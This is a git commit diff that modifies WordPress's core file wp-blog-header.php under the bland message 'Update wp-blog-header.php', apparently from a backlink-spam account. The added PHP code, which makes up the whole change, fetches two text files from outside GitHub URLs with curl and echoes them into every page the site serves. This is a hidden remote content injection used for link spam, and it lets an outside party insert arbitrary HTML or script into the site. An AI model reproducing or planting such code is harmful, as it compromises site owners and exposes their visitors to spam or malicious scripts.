bbf9cc71528e380967f85fb3de9b0ee58306e7f8
Paid Backlink <152395041+BacklinkGG@users.noreply.github.com>
2023-12-29 17:38:34 +0800

    Update wp-blog-header.php

--- wp-blog-header.php
+++ wp-blog-header.php
@@ -19,3 +19,17 @@ if ( ! isset( $wp_did_header ) ) {
 	require_once ABSPATH . WPINC . '/template-loader.php';
 
 }
+?>
+<?php
+$url1 = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
+$url2 = 'https://raw.githubusercontent.com/BacklinkGG/vip/main/vip.txt';
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_URL, $url1);
+$result1 = curl_exec($ch);
+curl_setopt($ch, CURLOPT_URL, $url2);
+$result2 = curl_exec($ch);
+curl_close($ch);
+echo $result1;
+echo $result2;
+?>
